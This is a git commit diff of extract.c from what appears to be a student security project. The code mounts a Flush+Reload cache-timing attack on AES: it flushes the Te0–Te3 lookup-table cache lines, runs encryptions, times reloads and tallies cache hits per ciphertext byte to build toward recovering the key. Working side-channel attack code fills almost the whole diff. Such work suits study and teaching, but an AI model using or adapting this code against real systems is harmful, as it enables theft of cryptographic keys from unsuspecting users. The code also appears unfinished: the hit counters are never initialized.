199bd65d4954401cda85c2ea294c96db95015690
ihadula3 <ihadula3@gatech.edu>
2024-04-11 12:32:15 -0400

    new data structure for hits tracking, one that doesnt take up so much damn memory lol

--- extract.c
+++ extract.c
@@ -5,7 +5,7 @@
 #include "fr_util.h"
 
 //number of encryptions to observe
-#define n_enc (10)
+#define n_enc (10000)
 
 //bytes in plaintext, 128 bits
 #define TXT_BYTES (16)
@@ -14,12 +14,20 @@
 #define TABLE_SIZE (1024)
 #define CACHE_LINESIZE (64)
 
+#define CACHELINES_PER_TABLE (16)
+
 //cache miss threshold, access time > threshold => cache miss
 /*** SET THESE ADDRESSES FOR SYSTEM BEFORE RUNNING ***/
-#define CACHE_MISS (355)
+#define CACHE_MISS (225)
+
 
 int main(int argc, char **argv) {
   srand(time(NULL));
+
+  //uint64_t num_addresses_tested = (TABLE_SIZE*4)/CACHE_LINESIZE;
+
+  //suppose we don't need to keep track of which cacheline was actually hit on, just which ciphertext bytes in relative positions get most hits
+  unsigned int hits_per_byte[TXT_BYTES][256];
 
   //key init, something easy to check
   const unsigned char key[] =
@@ -69,42 +77,6 @@ int main(int argc, char **argv) {
   te3 += start;
 
   for (int e = 0; e < n_enc; ++e) {
-      unsigned char plaintxt[TXT_BYTES];
-      unsigned char ciphertxt[TXT_BYTES];
-      for (int i = 0; i < TXT_BYTES; ++i) {
-        plaintxt[i] = rand() % 256;
-      }
-
-      //flush before encryption
-      for (int ii = 0; ii < TABLE_SIZE; ii += CACHE_LINESIZE) {
-        clflush(te0 + ii);
-        clflush(te1 + ii);
-        clflush(te2 + ii);
-        clflush(te3 + ii);
-      }
-
-      /*** DEBUG ENCRYPTION  ***/
-
-      // unsigned int len_p = 0;
-      // printf("PLAIN:");
-      // for(int i = 0; i < 16; i++) {
-      //   ++len_p;
-      //   printf("%d ", (unsigned char)plaintxt[i]);
-      // }
-      // printf("\nLENGTH PLAIN: %u ENC ROUND: %d\n", len_p, e);
-
-      AES_encrypt(plaintxt, ciphertxt, &enc_key);
-
-      /*** DEBUG ENCRYPTION  ***/
-      
-      // unsigned int len_c = 0;
-      // printf("CIPHER:");
-      // for(int i = 0; i < 16; i++) {
-      //   ++len_c;
-      //   printf("%d ", (unsigned char)ciphertxt[i]);
-      // }
-      // printf("\nLENGTH CIPHER: %u ENC ROUND: %d\n", len_c, e);
-
       //proceed to test access times for Te0, ..., Te3
 
       //Te0
@@ -115,19 +87,123 @@ int main(int argc, char **argv) {
           printf("accessing past boundaries of AES program... not good\n");
         }
 
-        printf("... TESTING ADDRESS %lx ...\n", test_addr);
+        //printf("... TESTING ADDRESS Te0 + %d = %lx ENCRYPTION ROUND %d...\n",ii, test_addr, e);
+        unsigned char plaintxt[TXT_BYTES];
+        unsigned char ciphertxt[TXT_BYTES];
+        for (int i = 0; i < TXT_BYTES; ++i) {
+          plaintxt[i] = rand() % 256;
+        }
         clflush(test_addr);
         AES_encrypt(plaintxt, ciphertxt, &enc_key);
         CYCLES acc_time = maccess_t(test_addr);
         if (acc_time < CACHE_MISS) {
-          printf(GREEN "        HIT " RESET "%lu\n", acc_time);
+          //printf(GREEN "        HIT " RESET " INDEXING TO %d\n", (CACHELINES_PER_TABLE * 0) + (ii/64));
+          hits_per_byte[2][ciphertxt[2]] += 1;
+          hits_per_byte[6][ciphertxt[6]] += 1;
+          hits_per_byte[10][ciphertxt[10]] += 1;
+          hits_per_byte[14][ciphertxt[14]] += 1;
         } else {
-          printf(RED "        MISS " RESET "%lu\n", acc_time);
+          //printf(RED "        MISS " RESET "%lu\n", acc_time);
         }
 
       }
       
+
+      //Te1
+      for (int ii = 0; ii < TABLE_SIZE; ii += CACHE_LINESIZE) {
+        ADDR_PTR test_addr = te1 + ii;
+
+        if (test_addr > end) {
+          printf("accessing past boundaries of AES program... not good\n");
+        }
+
+        //printf("... TESTING ADDRESS Te1 + %d = %lx ENCRYPTION ROUND %d...\n",ii, test_addr, e);
+        unsigned char plaintxt[TXT_BYTES];
+        unsigned char ciphertxt[TXT_BYTES];
+        for (int i = 0; i < TXT_BYTES; ++i) {
+          plaintxt[i] = rand() % 256;
+        }
+        clflush(test_addr);
+        AES_encrypt(plaintxt, ciphertxt, &enc_key);
+        CYCLES acc_time = maccess_t(test_addr);
+        if (acc_time < CACHE_MISS) {
+          //printf(GREEN "        HIT " RESET " INDEXING TO %d\n", (CACHELINES_PER_TABLE * 1) + (ii/64));
+          hits_per_byte[3][ciphertxt[3]] += 1;
+          hits_per_byte[7][ciphertxt[7]] += 1;
+          hits_per_byte[11][ciphertxt[11]] += 1;
+          hits_per_byte[15][ciphertxt[15]] += 1;
+        } else {
+          //printf(RED "        MISS " RESET "%lu\n", acc_time);
+        }
+
+      }
+
+      //Te2
+      for (int ii = 0; ii < TABLE_SIZE; ii += CACHE_LINESIZE) {
+        ADDR_PTR test_addr = te2 + ii;
+
+        if (test_addr > end) {
+          printf("accessing past boundaries of AES program... not good\n");
+        }
+
+        //printf("... TESTING ADDRESS Te2 + %d = %lx ENCRYPTION ROUND %d...\n",ii, test_addr, e);
+        unsigned char plaintxt[TXT_BYTES];
+        unsigned char ciphertxt[TXT_BYTES];
+        for (int i = 0; i < TXT_BYTES; ++i) {
+          plaintxt[i] = rand() % 256;
+        }
+        clflush(test_addr);
+        AES_encrypt(plaintxt, ciphertxt, &enc_key);
+        CYCLES acc_time = maccess_t(test_addr);
+        if (acc_time < CACHE_MISS) {
+          //printf(GREEN "        HIT " RESET " INDEXING TO %d\n", (CACHELINES_PER_TABLE * 2) + (ii/64));
+          hits_per_byte[0][ciphertxt[0]] += 1;
+          hits_per_byte[4][ciphertxt[4]] += 1;
+          hits_per_byte[8][ciphertxt[8]] += 1;
+          hits_per_byte[12][ciphertxt[12]] += 1;
+        } else {
+          //printf(RED "        MISS " RESET "%lu\n", acc_time);
+        }
+
+      }
+
+      //Te3
+      for (int ii = 0; ii < TABLE_SIZE; ii += CACHE_LINESIZE) {
+        ADDR_PTR test_addr = te3 + ii;
+
+        if (test_addr > end) {
+          printf("accessing past boundaries of AES program... not good\n");
+        }
+
+        //printf("... TESTING ADDRESS Te3 + %d = %lx ENCRYPTION ROUND %d...\n",ii, test_addr, e);
+        unsigned char plaintxt[TXT_BYTES];
+        unsigned char ciphertxt[TXT_BYTES];
+        for (int i = 0; i < TXT_BYTES; ++i) {
+          plaintxt[i] = rand() % 256;
+        }
+        clflush(test_addr);
+        AES_encrypt(plaintxt, ciphertxt, &enc_key);
+        CYCLES acc_time = maccess_t(test_addr);
+        if (acc_time < CACHE_MISS) {
+          //printf(GREEN "        HIT " RESET " INDEXING TO %d\n", (CACHELINES_PER_TABLE * 3) + (ii/64));
+          hits_per_byte[1][ciphertxt[1]] += 1;
+          hits_per_byte[5][ciphertxt[5]] += 1;
+          hits_per_byte[9][ciphertxt[9]] += 1;
+          hits_per_byte[13][ciphertxt[13]] += 1;
+        } else {
+          //printf(RED "        MISS " RESET "%lu\n", acc_time);
+        }
+
+      }
   }
 
+  //
+
+
+  close(aes);
+  munmap(start, map_size);
+  fflush(stdout);
+
   return 0;
+  
 }
